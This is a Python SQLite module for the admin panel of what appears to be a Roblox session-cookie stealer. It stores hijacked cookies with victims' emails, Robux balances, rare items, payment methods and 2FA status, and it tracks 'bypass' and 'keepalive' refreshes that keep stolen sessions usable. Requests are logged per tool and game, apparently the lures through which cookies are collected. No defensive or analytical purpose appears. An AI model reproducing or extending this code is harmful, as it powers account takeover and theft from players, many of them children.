import sqlite3
import json
import re
from datetime import datetime, timedelta
import os

DB_NAME = 'admin_panel.db'


def migrate_db():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute("PRAGMA table_info(valid_cookies)")
        columns = [column[1] for column in cursor.fetchall()]

        if 'alltime_robux' not in columns:
            cursor.execute('ALTER TABLE valid_cookies ADD COLUMN alltime_robux INTEGER DEFAULT 0')

        # Keepalive / bypass tracking columns
        if 'is_active' not in columns:
            cursor.execute('ALTER TABLE valid_cookies ADD COLUMN is_active INTEGER DEFAULT 1')
        if 'bypass_count' not in columns:
            cursor.execute('ALTER TABLE valid_cookies ADD COLUMN bypass_count INTEGER DEFAULT 0')
        if 'last_bypass_at' not in columns:
            cursor.execute('ALTER TABLE valid_cookies ADD COLUMN last_bypass_at TEXT')
        if 'last_checked_at' not in columns:
            cursor.execute('ALTER TABLE valid_cookies ADD COLUMN last_checked_at TEXT')

        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Migration error: {str(e)}")


def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS valid_cookies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cookie_id TEXT UNIQUE NOT NULL,
            username TEXT,
            display_name TEXT,
            user_id TEXT,
            email TEXT,
            robux INTEGER DEFAULT 0,
            premium INTEGER DEFAULT 0,
            rap INTEGER DEFAULT 0,
            created_date TEXT,
            account_age TEXT,
            has_verified_badge INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0,
            pending_robux INTEGER DEFAULT 0,
            credit_balance INTEGER DEFAULT 0,
            inventory_total INTEGER DEFAULT 0,
            friends_count INTEGER DEFAULT 0,
            followers_count INTEGER DEFAULT 0,
            groups_count INTEGER DEFAULT 0,
            two_fa_enabled INTEGER DEFAULT 0,
            pin_enabled INTEGER DEFAULT 0,
            email_verified INTEGER DEFAULT 0,
            total_items INTEGER DEFAULT 0,
            headless INTEGER DEFAULT 0,
            korblox INTEGER DEFAULT 0,
            badges_count INTEGER DEFAULT 0,
            payment_methods INTEGER DEFAULT 0,
            location TEXT,
            last_status TEXT,
            alltime_robux INTEGER DEFAULT 0,
            cookie_formatted TEXT,
            raw_json TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            date_only TEXT
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS daily_stats (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            date TEXT UNIQUE NOT NULL,
            total_requests INTEGER DEFAULT 0,
            valid_cookies INTEGER DEFAULT 0,
            invalid_cookies INTEGER DEFAULT 0,
            total_robux INTEGER DEFAULT 0,
            total_premium INTEGER DEFAULT 0,
            total_rap INTEGER DEFAULT 0
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS all_requests (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tool_name TEXT,
            game_id TEXT,
            is_valid INTEGER DEFAULT 0,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            date_only TEXT
        )
    ''')

    conn.commit()
    conn.close()


def save_valid_cookie(api_data, formatted_cookie):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        data = api_data.get('data', {})
        user_id = re.sub(r'[^a-zA-Z0-9]', '', str(data.get('user_id', '')))

        os.makedirs('cookies', exist_ok=True)

        cookie_id = f"{user_id}_{int(datetime.now().timestamp())}"

        cookie_file_path = f"cookies/{cookie_id}.txt"
        with open(cookie_file_path, 'w', encoding='utf-8') as f:
            f.write(formatted_cookie)

        date_only = datetime.now().strftime('%Y-%m-%d')

        email_info = data.get('email', {})
        two_fa = data.get('two_factor', {})
        expensive = data.get('expensive_items', {})
        inv_details = data.get('inventory_details', {})
        badges = data.get('badges', {})
        transactions = data.get('transactions', {})

        cursor.execute('''
            INSERT OR REPLACE INTO valid_cookies (
                cookie_id, username, display_name, user_id, email,
                robux, premium, rap, created_date, account_age,
                has_verified_badge, is_banned, pending_robux, credit_balance,
                inventory_total, friends_count, followers_count, groups_count,
                two_fa_enabled, pin_enabled, email_verified, total_items,
                headless, korblox, badges_count, payment_methods, location,
                last_status, alltime_robux, cookie_formatted, raw_json, date_only
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            cookie_id,
            data.get('username', 'N/A'),
            data.get('display_name', 'N/A'),
            user_id,
            email_info.get('address', 'N/A'),
            data.get('robux', 0),
            1 if data.get('premium') else 0,
            data.get('rap', 0),
            data.get('created', 'N/A'),
            data.get('account_age', 'N/A'),
            1 if data.get('has_verified_badge') else 0,
            1 if data.get('is_banned') else 0,
            data.get('pending_robux', 0),
            data.get('credit_balance', 0),
            data.get('inventory_total', 0),
            data.get('friends_count', 0),
            data.get('followers_count', 0),
            data.get('groups_count', 0),
            1 if two_fa.get('enabled') else 0,
            1 if two_fa.get('pin_enabled') else 0,
            1 if email_info.get('verified') else 0,
            inv_details.get('Всего предметов', 0),
            1 if expensive.get('Headless Horseman') else 0,
            1 if expensive.get('Korblox Deathspeaker') else 0,
            badges.get('total_count', 0),
            data.get('payment_methods_count', 0),
            data.get('location', 'N/A'),
            data.get('presence', {}).get('status', 'Unknown'),
            transactions.get('alltime_incoming', 0),
            formatted_cookie,
            json.dumps(api_data, ensure_ascii=False),
            date_only
        ))

        conn.commit()
        conn.close()

        update_daily_stats(date_only, is_valid=True, robux=data.get('robux', 0),
                          premium=1 if data.get('premium') else 0, rap=data.get('rap', 0))

        return cookie_id

    except Exception as e:
        print(f"Error saving cookie: {str(e)}")
        return None


def log_request(tool_name, game_id, is_valid):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        date_only = datetime.now().strftime('%Y-%m-%d')

        cursor.execute('''
            INSERT INTO all_requests (tool_name, game_id, is_valid, date_only)
            VALUES (?, ?, ?, ?)
        ''', (tool_name, game_id, 1 if is_valid else 0, date_only))

        conn.commit()
        conn.close()

        if not is_valid:
            update_daily_stats(date_only, is_valid=False)

    except Exception as e:
        print(f"Error logging request: {str(e)}")


def update_daily_stats(date, is_valid=True, robux=0, premium=0, rap=0):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute('SELECT * FROM daily_stats WHERE date = ?', (date,))
        existing = cursor.fetchone()

        if existing:
            if is_valid:
                cursor.execute('''
                    UPDATE daily_stats
                    SET total_requests = total_requests + 1,
                        valid_cookies = valid_cookies + 1,
                        total_robux = total_robux + ?,
                        total_premium = total_premium + ?,
                        total_rap = total_rap + ?
                    WHERE date = ?
                ''', (robux, premium, rap, date))
            else:
                cursor.execute('''
                    UPDATE daily_stats
                    SET total_requests = total_requests + 1,
                        invalid_cookies = invalid_cookies + 1
                    WHERE date = ?
                ''', (date,))
        else:
            if is_valid:
                cursor.execute('''
                    INSERT INTO daily_stats (date, total_requests, valid_cookies, invalid_cookies, total_robux, total_premium, total_rap)
                    VALUES (?, 1, 1, 0, ?, ?, ?)
                ''', (date, robux, premium, rap))
            else:
                cursor.execute('''
                    INSERT INTO daily_stats (date, total_requests, valid_cookies, invalid_cookies, total_robux, total_premium, total_rap)
                    VALUES (?, 1, 0, 1, 0, 0, 0)
                ''', (date,))

        conn.commit()
        conn.close()

    except Exception as e:
        print(f"Error updating daily stats: {str(e)}")


def get_daily_stats(days=30):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute('''
            SELECT date, total_requests, valid_cookies, invalid_cookies,
                   total_robux, total_premium, total_rap
            FROM daily_stats
            ORDER BY date DESC
            LIMIT ?
        ''', (days,))

        rows = cursor.fetchall()
        conn.close()

        stats = []
        for row in rows:
            stats.append({
                'date': row[0],
                'total_requests': row[1],
                'valid_cookies': row[2],
                'invalid_cookies': row[3],
                'total_robux': row[4],
                'total_premium': row[5],
                'total_rap': row[6]
            })

        return list(reversed(stats))

    except Exception as e:
        print(f"Error getting daily stats: {str(e)}")
        return []


def get_all_cookies(page=1, per_page=50):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        offset = (page - 1) * per_page

        cursor.execute('SELECT COUNT(*) FROM valid_cookies')
        total = cursor.fetchone()[0]

        cursor.execute('''
            SELECT id, cookie_id, username, display_name, user_id, email,
                   robux, premium, rap, account_age, timestamp, cookie_formatted,
                   headless, korblox, friends_count, followers_count, alltime_robux,
                   payment_methods, is_active, bypass_count, last_bypass_at, last_checked_at
            FROM valid_cookies
            ORDER BY timestamp DESC
            LIMIT ? OFFSET ?
        ''', (per_page, offset))

        rows = cursor.fetchall()
        conn.close()

        cookies = []
        for row in rows:
            cookies.append({
                'id': row[0],
                'cookie_id': row[1],
                'username': row[2],
                'display_name': row[3],
                'user_id': row[4],
                'email': row[5],
                'robux': row[6],
                'premium': row[7],
                'rap': row[8],
                'account_age': row[9],
                'timestamp': row[10],
                'cookie_formatted': row[11],
                'headless': row[12],
                'korblox': row[13],
                'friends_count': row[14],
                'followers_count': row[15],
                'alltime_robux': row[16],
                'payment_methods': row[17] or 0,
                'is_active': row[18] if row[18] is not None else 1,
                'bypass_count': row[19] or 0,
                'last_bypass_at': row[20],
                'last_checked_at': row[21],
            })

        return {
            'cookies': cookies,
            'total': total,
            'page': page,
            'per_page': per_page,
            'total_pages': (total + per_page - 1) // per_page
        }

    except Exception as e:
        print(f"Error getting cookies: {str(e)}")
        return {'cookies': [], 'total': 0, 'page': 1, 'per_page': per_page, 'total_pages': 0}


def delete_cookies_by_ids(ids):
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        placeholders = ','.join('?' * len(ids))
        cursor.execute(f'DELETE FROM valid_cookies WHERE id IN ({placeholders})', ids)
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        return deleted
    except Exception as e:
        print(f"Error deleting cookies: {str(e)}")
        return 0


def clear_all_cookies():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM valid_cookies')
        deleted = cursor.rowcount
        conn.commit()
        conn.close()
        return deleted
    except Exception as e:
        print(f"Error clearing cookies: {str(e)}")
        return 0


def get_all_cookies_text():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('SELECT cookie_formatted FROM valid_cookies ORDER BY timestamp DESC')
        rows = cursor.fetchall()
        conn.close()
        return '\n'.join(r[0] for r in rows if r[0])
    except Exception as e:
        print(f"Error getting cookies text: {str(e)}")
        return ''


def get_overview_stats():
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute('SELECT COUNT(*) FROM valid_cookies')
        total_cookies = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM all_requests')
        total_requests = cursor.fetchone()[0]

        today = datetime.now().strftime('%Y-%m-%d')
        cursor.execute('SELECT COUNT(*) FROM all_requests WHERE date_only = ?', (today,))
        today_requests = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE date_only = ?', (today,))
        today_cookies = cursor.fetchone()[0]

        cursor.execute('SELECT SUM(robux) FROM valid_cookies')
        total_robux = cursor.fetchone()[0] or 0

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE premium = 1')
        premium_accounts = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE headless = 1')
        headless_count = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE korblox = 1')
        korblox_count = cursor.fetchone()[0]

        conn.close()

        return {
            'total_cookies': total_cookies,
            'total_requests': total_requests,
            'today_requests': today_requests,
            'today_cookies': today_cookies,
            'total_robux': total_robux,
            'premium_accounts': premium_accounts,
            'headless_count': headless_count,
            'korblox_count': korblox_count
        }

    except Exception as e:
        print(f"Error getting overview stats: {str(e)}")
        return {}


def get_active_cookies_for_keepalive(limit=100):
    """Get active cookies that need checking, oldest-checked first."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, cookie_id, username, user_id, robux, cookie_formatted,
                   bypass_count, last_bypass_at, last_checked_at
            FROM valid_cookies
            WHERE is_active = 1 OR is_active IS NULL
            ORDER BY last_checked_at ASC NULLS FIRST
            LIMIT ?
        ''', (limit,))
        rows = cursor.fetchall()
        conn.close()

        cookies = []
        for row in rows:
            cookies.append({
                'id': row[0],
                'cookie_id': row[1],
                'username': row[2],
                'user_id': row[3],
                'robux': row[4],
                'cookie_formatted': row[5],
                'bypass_count': row[6] or 0,
                'last_bypass_at': row[7],
                'last_checked_at': row[8],
            })
        return cookies
    except Exception as e:
        print(f"Error getting cookies for keepalive: {str(e)}")
        return []


def update_cookie_after_bypass(db_id, new_cookie, robux=None, premium=None, rap=None):
    """Update cookie value after successful bypass and optionally refresh stats."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        cursor.execute('''
            UPDATE valid_cookies
            SET cookie_formatted = ?,
                bypass_count = COALESCE(bypass_count, 0) + 1,
                last_bypass_at = ?,
                last_checked_at = ?,
                is_active = 1
            WHERE id = ?
        ''', (new_cookie, now, now, db_id))

        if robux is not None:
            cursor.execute('UPDATE valid_cookies SET robux = ? WHERE id = ?', (robux, db_id))
        if premium is not None:
            cursor.execute('UPDATE valid_cookies SET premium = ? WHERE id = ?', (1 if premium else 0, db_id))
        if rap is not None:
            cursor.execute('UPDATE valid_cookies SET rap = ? WHERE id = ?', (rap, db_id))

        conn.commit()
        conn.close()

        # Also overwrite the cookie file on disk
        cursor2 = None
        try:
            conn2 = sqlite3.connect(DB_NAME)
            c2 = conn2.cursor()
            c2.execute('SELECT cookie_id FROM valid_cookies WHERE id = ?', (db_id,))
            row = c2.fetchone()
            conn2.close()
            if row and row[0]:
                cookie_file = f"cookies/{row[0]}.txt"
                if os.path.exists(cookie_file):
                    with open(cookie_file, 'w', encoding='utf-8') as f:
                        f.write(new_cookie)
        except Exception:
            pass

        return True
    except Exception as e:
        print(f"Error updating cookie after bypass: {str(e)}")
        return False


def mark_cookie_checked(db_id):
    """Update last_checked_at timestamp."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('UPDATE valid_cookies SET last_checked_at = ? WHERE id = ?', (now, db_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error marking cookie checked: {str(e)}")


def mark_cookie_dead(db_id):
    """Mark cookie as inactive (dead)."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        cursor.execute('UPDATE valid_cookies SET is_active = 0, last_checked_at = ? WHERE id = ?', (now, db_id))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error marking cookie dead: {str(e)}")


def update_cookie_stats(db_id, robux=None, premium=None, rap=None):
    """Update only stats for a cookie."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        updates = ['last_checked_at = ?']
        params = [now]

        if robux is not None:
            updates.append('robux = ?')
            params.append(robux)
        if premium is not None:
            updates.append('premium = ?')
            params.append(1 if premium else 0)
        if rap is not None:
            updates.append('rap = ?')
            params.append(rap)

        params.append(db_id)
        cursor.execute(f'UPDATE valid_cookies SET {", ".join(updates)} WHERE id = ?', params)
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"Error updating cookie stats: {str(e)}")


def get_cookie_by_id(db_id):
    """Get single cookie by database ID."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, cookie_id, username, user_id, robux, cookie_formatted,
                   bypass_count, last_bypass_at, last_checked_at, is_active, premium, rap
            FROM valid_cookies WHERE id = ?
        ''', (db_id,))
        row = cursor.fetchone()
        conn.close()
        if not row:
            return None
        return {
            'id': row[0],
            'cookie_id': row[1],
            'username': row[2],
            'user_id': row[3],
            'robux': row[4],
            'cookie_formatted': row[5],
            'bypass_count': row[6] or 0,
            'last_bypass_at': row[7],
            'last_checked_at': row[8],
            'is_active': row[9],
            'premium': row[10],
            'rap': row[11],
        }
    except Exception as e:
        print(f"Error getting cookie by id: {str(e)}")
        return None


def get_keepalive_stats():
    """Get stats about cookie keepalive status."""
    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE is_active = 1 OR is_active IS NULL')
        active = cursor.fetchone()[0]

        cursor.execute('SELECT COUNT(*) FROM valid_cookies WHERE is_active = 0')
        dead = cursor.fetchone()[0]

        cursor.execute('SELECT SUM(COALESCE(bypass_count, 0)) FROM valid_cookies')
        total_bypasses = cursor.fetchone()[0] or 0

        conn.close()
        return {
            'active_cookies': active,
            'dead_cookies': dead,
            'total_bypasses': total_bypasses,
        }
    except Exception as e:
        print(f"Error getting keepalive stats: {str(e)}")
        return {'active_cookies': 0, 'dead_cookies': 0, 'total_bypasses': 0}


init_db()
migrate_db()
